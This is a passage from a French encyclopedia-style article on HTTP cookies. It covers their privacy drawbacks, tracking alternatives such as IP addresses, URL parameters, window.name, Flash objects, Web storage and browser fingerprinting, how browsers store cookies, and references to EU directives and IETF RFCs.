L'utilisation des cookies peut générer une contradiction entre l'état du client et l'état stocké dans le cookie. Si l'utilisateur acquiert un cookie et clique sur le bouton « Retour » du navigateur, l'état du navigateur n'est généralement pas le même qu'avant cette acquisition. Par exemple, si le panier d'une boutique en ligne est réalisé en utilisant les cookies, le contenu du panier ne peut pas changer quand l'utilisateur revient dans l'historique du navigateur : si l'utilisateur presse sur un bouton pour ajouter un article dans son panier et clique sur le bouton « Retour », l'article reste dans celui-ci. Cela n'est peut-être pas l'intention de l'utilisateur, qui veut certainement annuler l'ajout de l'article. Cela peut mener à un manque de fiabilité, de la confusion, et des bugs. Les développeurs web doivent donc être conscients de ce problème et mettre en œuvre des mesures visant à gérer des situations comme celle-ci.


### Échéance de cookie
Les cookies permanents ont été critiqués par les experts de la sécurité de la vie privée pour ne pas être prévus pour expirer assez tôt, et de ce fait permettre aux sites web de suivre les utilisateurs et de construire au fur et à mesure leur profil. Cet aspect des cookies fait partie aussi du problème de détournement de session, parce qu'un cookie permanent volé peut être utilisé pour se faire passer pour un utilisateur pour une période de temps considérable.


## Alternatives aux cookies
Certaines opérations qui peuvent être réalisées en utilisant les cookies peuvent aussi être réalisées en utilisant d'autres mécanismes qui permettent de se passer de cookies ou de recréer des cookies effacés, ce qui crée des problèmes de vie privée de la même manière (ou parfois pire car alors invisibles) que les cookies.


### Adresse IP
Les utilisateurs peuvent être suivis avec l'adresse IP de l'ordinateur appelant la page. Cette technique a été disponible depuis l'introduction du World Wide Web, au fur et à mesure que les pages sont téléchargées le serveur demande l'adresse IP de l'ordinateur faisant fonctionner le navigateur ou le proxy, si un proxy est utilisé. Le serveur peut suivre cette information qu'il y ait ou non des cookies utilisés. Cependant, ces adresses sont typiquement moins fiables dans l'identification d'un utilisateur que les cookies car les ordinateurs et les proxys peuvent être partagés par plusieurs utilisateurs, et le même ordinateur peut recevoir une adresse IP différente sur chaque session de travail (comme c'est souvent le cas pour les connexions téléphoniques).
Le suivi par les adresses IP peut être fiable dans certaines situations, comme le cas des connexions à bandes larges qui maintiennent la même adresse IP pour une longue période, aussi longtemps que le courant passe.
Certains systèmes comme Tor sont conçus pour maintenir l'anonymat d'Internet et rendre impossible ou impraticable le suivi par adresse IP.


### URL
Une technique plus précise est basée sur l'encastrement d'information dans les URL. La partie requête de chaînes de caractères de l'URL est l'une des techniques qui sont typiquement utilisées dans ce but, mais d'autres parties peuvent être utilisées aussi bien. Le servlet Java et les mécanismes de session PHP utilisent tous les deux cette méthode si les cookies ne sont pas activés.
Cette méthode comprend le serveur web apposant des requêtes de chaînes de caractères aux liens de la page web qui la porte quand elle est envoyée au navigateur. Quand l'utilisateur suit un lien, le navigateur retourne la chaîne de requête attachée, au serveur.
Les chaînes de requête utilisées dans ce but et les cookies sont très similaires, tous les deux étant des informations arbitrairement choisies par le serveur et renvoyées par le navigateur. Cependant, il y a quelques différences : lorsqu'une URL contenant une chaîne de requête est réutilisée, les mêmes informations sont envoyées au serveur. Par exemple, si les préférences d'un utilisateur sont encodées dans une chaîne de requête d'une URL et que l'utilisateur envoie cette URL à un autre utilisateur par e-mail, ce dernier pourra également utiliser ces préférences. En revanche, lorsqu'un utilisateur accède à la même page deux fois, il n'y a pas de garantie que la même chaîne de requête soit utilisée les deux fois. Par exemple, si un utilisateur arrive sur une page à partir d'une page interne du site la première fois et arrive sur la même page à partir d'une page externe la seconde fois, la chaîne de requête relative à la page du site est typiquement différente, alors que les cookies sont les mêmes.
Les autres inconvénients des chaînes de requêtes sont liés à la sécurité : garder les données qui identifient une session en chaînes de requêtes permet ou simplifie les attaques de fixation de session, les attaques de référence à l'identifiant et d'autres exploitations des failles. Transférer les identifiants de session en tant que cookies HTTP est plus sécurisé.


### Champ de formulaire caché
Une forme de suivi de session, utilisée par ASP.NET, est d'utiliser les formulaires web avec des champs cachés. Cette technique est très similaire à l'utilisation des chaînes de requêtes par URL pour porter l'information et a les mêmes avantages et inconvénient ; et si le formulaire est traité avec la méthode HTTP GET, les champs deviennent en fait une partie de l'URL du navigateur qui l'enverra lors de la soumission du formulaire. Mais la plupart des formulaires sont traités avec HTTP POST, qui provoque le formulaire d'information, incluant les champs cachés, pour être ajouté comme une entrée supplémentaire qui n'est ni une partie de l'URL, ni un cookie.
Cette approche présente deux avantages du point de vue du suivi : premièrement, le suivi de l'information placée dans le code source HTML et en entrée POST plutôt que dans l'URL permettra à l'utilisateur moyen de ne pas remarquer ce suivi ; deuxièmement, la session d'information n'est pas copiée quand l'utilisateur copie l'URL (pour sauvegarder la page sur disque ou l'envoyer via l'e-mail, par exemple).


### window.name
Tous les navigateurs webs courants peuvent stocker une assez grande quantité de données (2 Mo à 32 Mo) via JavaScript en utilisant la propriété du DOM window.name. Cette donnée peut être utilisée à la place des sessions de cookies et l'est aussi à travers les domaines. La technique peut être couplée avec les objets JSON pour stocker un ensemble complexe de variables de sessions du côté client.
L'inconvénient est que chaque fenêtre séparée ou onglet aura initialement un window.name vide ; lors de la navigation par onglets (ouverture par l'utilisateur) cela veut dire que les onglets ouvert individuellement n'auront pas de nom de fenêtre. De plus window.name peut être utilisé pour suivre les visiteurs à travers différents sites ce qui peut poser un problème de vie privée.
À certains égards cela peut être plus sécurisé que les cookies, du fait de la non implication du serveur, ce qui rend donc invulnérable à l'attaque réseau des cookies renifleurs. Cependant, si des mesures spéciales sont prises pour protéger les données, elles sont vulnérables à d'autres attaques, car les données sont disponibles à travers d'autres sites ouverts dans la même fenêtre.


### Authentification HTTP
Le protocole HTTP inclut les protocoles d'authentification d'accès de base et la digestion de l'authentification d'accès, qui permet l'accès à une page web seulement lorsque l'utilisateur a donné le nom d'utilisateur et le mot de passe correct. Si le serveur demande un certificat pour accorder l'accès à une page web, le navigateur le demande à l'utilisateur et une fois obtenu, le navigateur le stocke et l'envoie dans toutes les requêtes HTTP suivantes. Cette information peut être utilisée pour suivre l'utilisateur.


### Objet local partagé

Si un navigateur inclut le greffon Adobe Flash Player, les objets locaux partagés peuvent être utilisés dans le même but que les cookies. Ils peuvent être un choix attractif pour les développeurs web car :

la taille limite par défaut d'un objet local partagé est de 100 ko ;
les contrôles de sécurité sont distincts des contrôles des cookies de l'utilisateur (donc les objets locaux partagés peuvent être autorisés quand les cookies ne le sont pas).
Ce dernier point, qui distingue la politique de gestion des cookies de celle des objets locaux partagés d'Adobe suscite des interrogations concernant la gestion par l'utilisateur de ses paramètres de confidentialité : celui-ci doit être conscient que sa gestion des cookies n'a pas d'impact sur la gestion des objets locaux partagés, et inversement.
Une autre critique de ce système concerne le fait qu'il ne peut être utilisé qu'à travers le greffon Adobe Flash Player qui est propriétaire et n'est pas un standard du web.


### Persistance côté client
Certains navigateurs web supportent un script basé sur le mécanisme de persistance, qui permet à la page de stocker les informations localement pour une utilisation ultérieure. Internet Explorer, par exemple, supporte les informations persistantes dans l'historique du navigateur, en favoris, dans un format stocké en XML, ou directement avec une page web sauvée sur disque. Pour Microsoft Internet Explorer 5, il y a une méthode utilisateur–donnée disponible à travers les comportements DHTML.
Le W3C a introduit dans HTML 5 une nouvelle API JavaScript de stockage des données côté client appelée Web storage et visant à remplacer définitivement les cookies. Elle est semblable aux cookies mais avec une capacité grandement améliorée et sans stockage d'information dans l'en-tête des requêtes HTTP. L'API permet deux types de stockage web : localstorage et sessionstorage, similaires aux cookies persistants et aux cookies de session (à la différence que les cookies de session expirent à la fermeture du navigateur alors que les variables de sessionstorage expirent à la fermeture de l'onglet), respectivement. Web storage est supportée par Mozilla Firefox 3.5, Google Chrome 5, Apple Safari 4, Microsoft Internet Explorer 8 et Opera 10.50.
Un mécanisme différent s'appuie normalement sur la mise en cache des navigateurs (portant sur la mémoire plutôt que le rafraîchissement) utilisant les programmes JavaScript dans les pages web. Par exemple, une page peut contenir la balise <script type="text/javascript" src="exemple.js">. La première fois que la page se charge, le programme 'exemple.js' est aussi chargé. À ce point, le programme reste en mémoire cache et la page visitée n'est pas rechargée une seconde fois. En conséquence, si le programme contient une variable globale (par exemple var id = 3243242;), cet identifiant reste valide et peut être exploité par un autre code JavaScript une nouvelle fois que la page est chargée, ou une fois qu'une page liant le programme est chargée. L'inconvénient majeur de cette méthode est que la variable globale de JavaScript doit être statique, cela veut dire qu'elle ne peut pas être changée ou supprimée comme un cookie.


### Empreinte numérique de navigateur web

Une empreinte digitale de navigateur est une information collectée sur les paramètres de configuration d'un navigateur à des fins d'identification. Ces empreintes digitales peuvent être utilisées pour identifier totalement ou partiellement un internaute ou un appareil même lorsque les cookies sont désactivés.
Des informations de base sur la configuration des navigateurs web sont recueillies depuis longtemps par les services d'audience d'un site web dans le but de mesurer avec précision le trafic humain sur le web et détecter les différentes formes de fraude au clic. Avec l'aide de langages de script côté client, une collecte d'informations beaucoup plus précises est maintenant possible,. La conversion de ces informations dans une chaîne de bits produit une empreinte digitale d'appareil. En 2010, l'Electronic Frontier Foundation (EFF) a mesuré que l'entropie de l'empreinte d'un navigateur était d'au moins 18,1 bits, et c'était avant que les progrès du canvas fingerprinting  n'ajoute 5,7 bits à cette entropie.


### Identifiant pour publicitaires (IDFA)
La société Apple utilise une technique de pistage nommée « identifier for advertisers » (IDFA). Cette technique attribue un identifiant unique à chaque utilisateur d'un outil fonctionnant sur iOS (par exemple iPhone ou iPad). Cet identifiant est ensuite utilisé par le réseau publicitaire d'Apple, iAd, pour déterminer quelle publicité les utilisateurs sont en train de visualiser et de répondre.


## En résumé
Les cookies sont de petits fichiers textes stockés par le navigateur web sur le disque dur du visiteur d'un site web et qui servent (entre autres) à enregistrer des informations sur le visiteur ou encore sur son parcours dans le site. Le webmaster peut ainsi reconnaître les habitudes d'un visiteur et personnaliser la présentation de son site pour chaque visiteur ; les cookies permettent alors de garder en mémoire combien d'articles il faut afficher en page d'accueil ou encore de retenir les identifiants de connexion à une éventuelle partie privée : lorsque le visiteur revient sur le site, il ne lui est plus nécessaire de taper son nom et son mot de passe pour se faire reconnaître, puisqu'ils sont automatiquement lus dans le cookie.
Un cookie a une durée de vie limitée, fixée par le concepteur du site. Ils peuvent aussi expirer à la fin de la session sur le site, ce qui correspond à la fermeture du navigateur. Les cookies sont largement utilisés pour simplifier la vie des visiteurs et leur présenter des informations plus pertinentes. Mais des techniques particulières permettent de suivre un visiteur sur plusieurs sites et ainsi de collecter et recouper des informations très étendues sur ses habitudes. Cette méthode a donné à l'usage des cookies une réputation de technique de surveillance violant la sphère privée des visiteurs ce qui correspond hélas à la réalité dans de nombreux cas d’utilisation pour des raisons non « technique » ou non respectueuses des attentes des utilisateurs.
En réponse à ces craintes légitimes, l'HTML 5 introduit une nouvelle API JavaScript de stockage des données côté client appelée Web storage, beaucoup plus sure et avec une plus grande capacité, qui vise à remplacer les cookies.


## Stockage des cookies
Avec certains navigateurs, un cookie est facilement modifiable, en effet un logiciel éditeur de texte (ex. : Bloc-notes) suffit à en changer les valeurs manuellement.
Les cookies sont enregistrés différemment selon les navigateurs :

Microsoft Internet Explorer enregistre chaque cookie dans un fichier différent ;
Mozilla Firefox enregistre tous ses cookies dans un seul fichier (une base de données SQLite) ;
Opera enregistre tous ses cookies dans un seul fichier et le chiffre (impossible de les modifier sauf depuis les options du logiciel) ;
Apple Safari enregistre tous ses cookies dans un seul fichier ayant l'extension « .plist ». La modification est possible mais très peu aisée, à moins de passer par les options du logiciel.
Il est demandé aux navigateurs de supporter au minimum :

300 cookies simultanés ;
4 096 octets par cookie ;
20 cookies par hôte ou par domaine.


## Notes et références
(en) Cet article contient des extraits de la Free On-line Dictionary of Computing qui autorise l'utilisation de son contenu sous licence GFDL.


## Voir aussi


### Articles connexes
Internet Engineering Task Force (IETF), produit la plupart des nouveaux standards d'Internet.
HTTP
Client HTTP
Navigateur web
Secure cookie
Platform for Privacy Preferences, projet à l'initiative du consortium W3C (qui énonce les standards du Web et d'Internet), datant de 2002
World Wide Web
Local Shared Object (LSO), un équivalent utilisé par Adobe Flash
Logiciel antipub dont un effet peut être d'éviter le pistage de l'internaute par les régies de publicité s'appuyant sur le système de cookies de sites tiers
Unique Identifier Header, technologie numérique d'identification qui permet de suivre la navigation sur internet d'un utilisateur.
Historique de navigation web


### Liens externes

« Profilage : vous reprendrez bien un petit cookie ? », La Science, CQFD, France Culture, 16 août 2023.
Informations à caractère juridique (en français) :

Sur la directive 2009/136/CE modifiant la directive 2002/22/CE concernant le service universel et les droits des utilisateurs au regard des réseaux et services de communications électroniques, la directive 2002/58/CE concernant le traitement des données à caractère personnel et la protection de la vie privée dans le secteur des communications électroniques et le règlement (CE) n o 2006/2004 relatif à la coopération entre les autorités nationales chargées de veiller à l’application de la législation en matière de protection des consommateurs :
(fr) Directive 2009/136/CE du Parlement européen et du Conseil du 25 novembre 2009 sur le site eur-lex.europa.eu
(fr) Directive 2009/136/CE du Parlement européen et du Conseil du 25 novembre 2009 sur le site legifrance.gouv.fr
(fr) La définition d’un Cookie informatique d’après la Commission Nationale de l’Informatique et des Libertés Française  https://www.cnil.fr/fr/definition/cookie
Informations à caractère technique (en anglais) :

(en) Persistent Client State HTTP Cookies - Preliminary Specification, copie de la première spécification des cookies
(en) HTTP State Management Mechanism, RFC 2109, février 1997, ancien standard de l'IETF
(en) HTTP State Management Mechanism, RFC 2965, octobre 2000, ancien standard de l'IETF
(en) HTTP State Management Mechanism, RFC 6265, avril 2011, standard actuel de l'IETF
 Portail d’Internet   Portail de la sécurité informatique   Portail des télécommunications